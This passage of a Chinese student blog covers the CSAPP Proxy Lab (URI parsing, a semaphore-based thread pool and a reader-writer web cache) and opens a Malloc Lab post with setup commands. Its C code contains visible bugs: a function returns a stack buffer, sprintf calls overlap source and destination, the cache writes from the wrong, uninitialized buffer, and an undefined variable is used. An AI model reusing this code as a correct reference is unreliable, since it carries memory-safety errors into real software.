class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">parse_uri</span><span class="params">(<span class="keyword">char</span> *uri)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//是否有host：port，port默认80</span></span><br><span class="line">    <span class="keyword">char</span> *hostpath = <span class="built_in">strstr</span>(uri,<span class="string">&quot;//&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(hostpath != <span class="literal">NULL</span>) <span class="comment">//有</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//是否有port</span></span><br><span class="line">        <span class="keyword">char</span> *portpath = <span class="built_in">strstr</span>(hostpath + <span class="number">2</span>,<span class="string">&quot;:&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(portpath != <span class="literal">NULL</span>) <span class="comment">//有</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> num;</span><br><span class="line">            <span class="built_in">sscanf</span>(portpath+<span class="number">1</span>,<span class="string">&quot;%d%s&quot;</span>,&amp;num,send_path);</span><br><span class="line">            <span class="built_in">sprintf</span>(send_port,<span class="string">&quot;%d&quot;</span>,num);</span><br><span class="line">            *portpath = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">//无</span></span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">char</span> *path = <span class="built_in">strstr</span>(hostpath + <span class="number">2</span>,<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        	<span class="keyword">if</span>(path != <span class="literal">NULL</span>) </span><br><span class="line">        	&#123;</span><br><span class="line">                <span class="built_in">strcpy</span>(send_path,path);</span><br><span class="line">        		<span class="built_in">strcpy</span>(send_port,<span class="string">&quot;80&quot;</span>);</span><br><span class="line">            	*path = <span class="literal">NULL</span>;</span><br><span class="line">			&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">strcpy</span>(send_host,hostpath + <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>  <span class="comment">//无</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> *path = <span class="built_in">strstr</span>(uri,<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(path != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">strcpy</span>(send_path,path);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">strcpy</span>(send_port,<span class="string">&quot;80&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">built_message</span><span class="params">( <span class="keyword">char</span> *getit,<span class="keyword">rio_t</span> *rp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//构造新头</span></span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> rio[MAXLINE];</span><br><span class="line">    <span class="built_in">sprintf</span>(buf,<span class="string">&quot;%s&quot;</span>,getit);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf,<span class="string">&quot;%sHost: %s\r\n&quot;</span>,buf,send_host);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf,<span class="string">&quot;%sUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3\r\n&quot;</span>,buf);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf,<span class="string">&quot;%sConnection: close\r\n&quot;</span>,buf);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf,<span class="string">&quot;%sProxy-Connection: close\r\n\r\n&quot;</span>,buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//补上原内容</span></span><br><span class="line">    Rio_readnb(rp,rio,MAXLINE);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf,<span class="string">&quot;%s%s&quot;</span>,buf,rio);</span><br><span class="line">    <span class="keyword">return</span> buf;</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure>



<h2 id="II-多线程的并发"><a href="#II-多线程的并发" class="headerlink" title="II . 多线程的并发"></a>II . 多线程的并发</h2><p>实现多线程使用 消费者-生产者 模型：</p>
<p>消费者和生产者共同使用一个 n个槽的优先缓冲区，生产者产生新的项目并插入缓冲区；消费者取出这些项目并使用；</p>
<p>因此两者的访问需要互斥，并且调度地访问：空状态（消费者等待），满状态（生产者等待）；</p>
<p>在这个实验里，<strong>消费者就是服务端</strong>，接受各样的连接；<strong>生产者就是客户端</strong>，发送各样的连接；</p>
<p>实现缓冲区：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> *buf;          <span class="comment">// 缓冲区数组         </span></span><br><span class="line">    <span class="keyword">int</span> n;             <span class="comment">// 槽的最大数量</span></span><br><span class="line">    <span class="keyword">int</span> front;         <span class="comment">// buf[(front+1)%n] 是第一个项目</span></span><br><span class="line">    <span class="keyword">int</span> rear;          <span class="comment">// buf[rear%n] 是最后一个项目</span></span><br><span class="line">    <span class="keyword">sem_t</span> mutex;       <span class="comment">//互斥锁，初始化1</span></span><br><span class="line">    <span class="keyword">sem_t</span> slots;       <span class="comment">//记录槽，初始化n</span></span><br><span class="line">    <span class="keyword">sem_t</span> items;       <span class="comment">//记录项目，初始化0</span></span><br><span class="line">&#125; <span class="keyword">sbuf_t</span>;</span><br></pre></td></tr></table></figure>

<p>客户端插入函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_insert</span><span class="params">(<span class="keyword">sbuf_t</span> *sp, <span class="keyword">int</span> item)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    P(&amp;sp-&gt;slots);                          <span class="comment">// 对slots加锁，保证槽位满时，客户端挂起</span></span><br><span class="line">    P(&amp;sp-&gt;mutex);                          <span class="comment">// 对缓冲区互斥访问</span></span><br><span class="line">    sp-&gt;buf[(++sp-&gt;rear)%(sp-&gt;n)] = item;   <span class="comment">// 添加项目</span></span><br><span class="line">    V(&amp;sp-&gt;mutex);                          <span class="comment">// 解锁</span></span><br><span class="line">    V(&amp;sp-&gt;items);                          <span class="comment">//与slots对应地调整items</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端实现后移除项目的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sbuf_remove</span><span class="params">(<span class="keyword">sbuf_t</span> *sp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> item;</span><br><span class="line">    P(&amp;sp-&gt;items);                          <span class="comment">// 如果项目没有，服务端挂起</span></span><br><span class="line">    P(&amp;sp-&gt;mutex);                          <span class="comment">// 加锁缓冲区</span></span><br><span class="line">    item = sp-&gt;buf[(++sp-&gt;front)%(sp-&gt;n)];  <span class="comment">// 移除项目</span></span><br><span class="line">    V(&amp;sp-&gt;mutex);                          <span class="comment">// 解锁</span></span><br><span class="line">    V(&amp;sp-&gt;slots);                         </span><br><span class="line">    <span class="keyword">return</span> item;							<span class="comment">//返回客户端的描述符</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主函数（和tiny的main差不多）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> listenfd, connfd;</span><br><span class="line">    <span class="keyword">char</span> hostname[MAXLINE], port[MAXLINE];</span><br><span class="line">    <span class="keyword">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//输入端口参数</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;usage: %s &lt;port&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//阻塞SIGPIPE信号</span></span><br><span class="line">    signal(SIGPIPE,SIG_IGN);</span><br><span class="line">    <span class="comment">//监听描述符</span></span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建线程</span></span><br><span class="line">    sbuf_init(&amp;sbuf, SBUFSIZE);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NTHREADS; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Pthread_create(&amp;tid, <span class="literal">NULL</span>, thread, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">	clientlen = <span class="keyword">sizeof</span>(clientaddr);</span><br><span class="line">    <span class="comment">//接受请求成为描述符</span></span><br><span class="line">	connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen); </span><br><span class="line">    <span class="comment">//插入描述符</span></span><br><span class="line">    sbuf_insert(&amp;sbuf, connfd);</span><br><span class="line">        <span class="comment">//读取套接字信息，IP和端口</span></span><br><span class="line">        Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, </span><br><span class="line">                    port, MAXLINE, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Accepted connection from (%s, %s)\n&quot;</span>, hostname, port);                                       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>线程执行函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread</span><span class="params">(<span class="keyword">void</span> *vargp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Pthread_detach(pthread_self());</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="comment">//从缓冲区中读出描述符</span></span><br><span class="line">    <span class="keyword">int</span> connfd = sbuf_remove(&amp;sbuf);</span><br><span class="line"></span><br><span class="line">    doit(connfd);</span><br><span class="line">    Close(connfd);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="III-缓存web对象"><a href="#III-缓存web对象" class="headerlink" title="III . 缓存web对象"></a>III . 缓存web对象</h2><p>目的是为了让多次访问的web对象不用再连接服务器，直接响应；</p>
<p>这里会使用 读者-写者 模型 ，让线程从缓存中读和写：</p>
<p>只读的线程叫读者，只写的进程叫写者，读者可以和其他读者共享只读部分，写者需要有独立的访问；</p>
<p>这个模型有两种情况：</p>
<p>读者优先，写者优先；</p>
<p>这里使用读优先：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> read_cnt;		<span class="comment">//记录读者数量</span></span><br><span class="line"><span class="keyword">sem_t</span> mutex, w;    <span class="comment">//都初始化为1，w导使有读无写，有写无读</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reader</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        P(&amp;mutex);</span><br><span class="line">        readcnt++;</span><br><span class="line">        <span class="keyword">if</span>(readcnt==<span class="number">1</span>) <span class="comment">//第一个读者导致w加锁，则写者挂起；</span></span><br><span class="line">            P(&amp;w);</span><br><span class="line">        V(&amp;mutex);</span><br><span class="line">        </span><br><span class="line">        P(&amp;mutex);</span><br><span class="line">        readcnt--;</span><br><span class="line">        <span class="keyword">if</span>(readcnt==<span class="number">0</span>) <span class="comment">//最后一个读者结束解锁w</span></span><br><span class="line">            V(&amp;w);</span><br><span class="line">        V(&amp;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writer</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        P(&amp;w);</span><br><span class="line">        </span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line">        V(&amp;w)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置缓存区：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> obj[MAX_OBJECT_SIZE];</span><br><span class="line">    <span class="keyword">char</span> uri[MAXLINE];</span><br><span class="line">    <span class="keyword">int</span> LRU;</span><br><span class="line">    <span class="keyword">int</span> isEmpty;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> read_cnt; <span class="comment">//读者数量</span></span><br><span class="line">    <span class="keyword">sem_t</span> w;      <span class="comment">//Cache信号量</span></span><br><span class="line">    <span class="keyword">sem_t</span> mutex;  <span class="comment">//read_cnt信号量</span></span><br><span class="line"></span><br><span class="line">&#125; block;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    block data[MAX_CACHE];</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">&#125; Cache;</span><br></pre></td></tr></table></figure>

<p>修改doit函数中的内容，得到请求后，判断uri是否在缓存中，不在就添加进去：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doit</span><span class="params">(<span class="keyword">int</span> fd)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> backbuf[MAXLINE],newhd[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> *send;</span><br><span class="line">    <span class="keyword">char</span> cache_tag[MAXLINE];</span><br><span class="line">    <span class="keyword">rio_t</span> rio,serverfd_rio;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//读取请求行</span></span><br><span class="line">    Rio_readinitb(&amp;rio, fd);</span><br><span class="line">    <span class="keyword">if</span> (!Rio_readlineb(&amp;rio, buf, MAXLINE))  </span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%s %s %s&quot;</span>, method, uri, version);       <span class="comment">//解析请求行</span></span><br><span class="line">   	<span class="built_in">strcpy</span>(cache_tag,uri);</span><br><span class="line">    <span class="keyword">if</span> (strcasecmp(method, <span class="string">&quot;GET&quot;</span>)) &#123;                     <span class="comment">//是否为GET请求</span></span><br><span class="line">        clienterror(fd, method, <span class="string">&quot;501&quot;</span>, <span class="string">&quot;Not Implemented&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Tiny does not implement this method&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;                                                    </span><br><span class="line">    read_requesthdrs(&amp;rio);    <span class="comment">//显示请求行和头（printf）</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//uri是否存在缓存中</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span> ((i = get_Cache(cache_tag)) != <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//加锁</span></span><br><span class="line">        P(&amp;cache.data[i].mutex);</span><br><span class="line">        cache.data[i].read_cnt++;</span><br><span class="line">        <span class="keyword">if</span> (cache.data[i].read_cnt == <span class="number">1</span>)</span><br><span class="line">            P(&amp;cache.data[i].w);</span><br><span class="line">        V(&amp;cache.data[i].mutex);</span><br><span class="line"></span><br><span class="line">        Rio_writen(connfd, cache.data[i].obj, <span class="built_in">strlen</span>(cache.data[i].obj));</span><br><span class="line"></span><br><span class="line">        P(&amp;cache.data[i].mutex);</span><br><span class="line">        cache.data[i].read_cnt--;</span><br><span class="line">        <span class="keyword">if</span> (cache.data[i].read_cnt == <span class="number">0</span>)</span><br><span class="line">            V(&amp;cache.data[i].w);</span><br><span class="line">        V(&amp;cache.data[i].mutex);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//解析uri为host port path</span></span><br><span class="line">    parse_uri(uri);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//改写</span></span><br><span class="line">    <span class="built_in">sprintf</span>(newhd, <span class="string">&quot;GET %s HTTP/1.0\r\n&quot;</span>, send_path);</span><br><span class="line">    send = built_message(newhd,&amp;rio);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//开启远程服务器</span></span><br><span class="line">    <span class="keyword">int</span> serverfd = Open_clientfd(send_host,send_port);</span><br><span class="line">    <span class="keyword">if</span> (serverfd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;connection failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    Rio_readinitb(&amp;serverfd_rio, serverfd);</span><br><span class="line">    <span class="comment">//写入服务器</span></span><br><span class="line">    Rio_writen(serverfd, send, <span class="built_in">strlen</span>(send));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> cache_buf[MAX_OBJECT_SIZE];</span><br><span class="line">    <span class="keyword">int</span> size_buf = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> n;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//回响</span></span><br><span class="line">    <span class="keyword">while</span>((n = Rio_readlineb(&amp;serverfd_rio,backbuf,MAXLINE)) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        size_buf += n;</span><br><span class="line">        <span class="keyword">if</span>(size_buf &lt; MAX_OBJECT_SIZE)</span><br><span class="line">            <span class="built_in">strcat</span>(cache_buf, buf);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;proxy received %d bytes,then send\n&quot;</span>, (<span class="keyword">int</span>)n);</span><br><span class="line">        Rio_writen(fd,backbuf,n);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Close (serverfd);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//没有就写入缓存</span></span><br><span class="line">    <span class="keyword">if</span>(size_buf &lt; MAX_OBJECT_SIZE)&#123;</span><br><span class="line">        write_Cache(cache_tag, cache_buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>虽然迷迷糊糊的，但跟着线程走了一遍，多多少少学会了更多的东西：比如信号量的运用，线程创建和运作方式，以及状态机和模型的特点；但这个lab确实感受到了难度，等往后学的深入再返回看的话应该还会有收获；</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://secondbc.github.io/SecondBC/2022/10/01/Proxy-lab/" data-id="cl8pjyabk0000kwvcejxp4xht" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Malloc-Lab" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/SecondBC/2022/09/11/Malloc-Lab/" class="article-date">
  <time datetime="2022-09-11T15:31:27.000Z" itemprop="datePublished">2022-09-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/SecondBC/2022/09/11/Malloc-Lab/">Malloc_Lab</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><img src="https://s2.loli.net/2022/09/12/nTyIcwFaqgRKWh1.jpg" alt="forest"></p>
<hr>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>一个动态内存申请器，能实现：malloc， free， realloc；</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>CSAPP第9章：动态内存申请器，内存中的堆，链表；</p>
<h2 id="蛋疼的检测工具"><a href="#蛋疼的检测工具" class="headerlink" title="蛋疼的检测工具"></a>蛋疼的检测工具</h2><p>首先需要；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -O2 -m32   -c -o mdriver.o mdriver.c</span><br></pre></td></tr></table></figure>

<p>然后；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make mdriver mdriver.o mm.o memlib.o fsecs.o fcyc.o clock.o ftimer.o</span><br></pre></td></tr></table></figure>

<p>以上两个出错请用下面指令解决；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-multilib</span><br></pre></td></tr></table></figure>

<p>下载出错请更新镜像，或者添加清华园下载路径：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure>

<p>输入以下命令打开下载源：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<p>按 i 进入编辑模式，完成后输入 :w 保存， :q退出；之后输入一遍：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade</span><br></pre></td></tr></table></figure>

<p>然后就能输入第三条指令了，接着编译就行了；</p>
<p>其次，traces是缺失的，需要下载以进行检测；地址：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Davon-Feng/CSAPP-Labs/tree/master/yzf-malloclab-handout/traces">https://github.com/Davon-Feng/CSAPP-Labs/tree/master/yzf-malloclab-handout/traces</a></p>
<p>将10个文件装入文件夹，将文件夹放到和 mdriver 同级的地方；</p>
<p>并修改config.h里第15行的内容为自己的traces文件夹目录；</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul>
<li>需要内存空间模拟堆；</li>
<li>需要模拟已分配和未分配的块；</li>
<li>需要管理这个空间（开始，结束，填充）；</li>
<li>需要操控这个空间（放置，分割，合并，释放）；</li>
</ul>
<h2 id="已知内容"><a href="#已知内容" class="headerlink" title="已知内容"></a>已知内容</h2><p>mem_heap，mem_brk两个指针分别指向堆的开始和结尾，mem_sbrk函数可以调节brk并返回旧brk的值，两个指针已初始化相等；</p>
<p>堆中的最小单位为4字节（1字），第一个字是双字边界对齐不使用的填充字；后面跟着两字的序言块，分配器使用私有的全局变量 heap_listp 指向序言块的第二个字开头；以一个0内容的已分配块作为结束的一个字；</p>
<p>使用隐式空闲链表，下一次适配，边界标记的堆块格式（最小4字，开头和结尾2字是标志字），立即合并；</p>
<p>标志字由整个块的大小或上分配位组成；</p>
